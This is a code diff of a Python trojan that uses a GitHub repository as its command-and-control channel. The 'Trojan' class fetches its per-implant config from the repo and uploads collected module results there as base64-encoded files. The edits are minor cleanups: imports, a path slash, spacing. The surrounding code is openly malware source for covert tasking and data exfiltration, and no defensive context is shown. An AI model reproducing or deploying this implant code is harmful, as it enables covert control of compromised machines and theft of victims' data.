@@ -2,13 +2,11 @@ import json
 import base64
 import sys
 import time
-import types
 import importlib
 import random
 import threading
 import github3
-import queue
-from github3 import login
+
 from datetime import datetime
 
 
@@ -53,12 +51,12 @@ class Trojan:
     def __init__(self,id):
         self.id = id
         self.config_file =f'{id}.json'
-        self.data_path = f'data/{id}'
+        self.data_path = f'data/{id}/'
         self.repo = github_connect()
     
 
     def get_config(self):
-        global configured
+       
         config_json = get_file_contents(
             'config',self.config_file,self.repo
         )
@@ -72,7 +70,7 @@ class Trojan:
     def store_module_result(self,data):
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
-        bindata = bytes('%r' %data,'utf-8')
+        bindata = bytes('%r' % data,'utf-8')
         self.repo.create_file(remote_path, message, 
         base64.b64encode(bindata))
         return
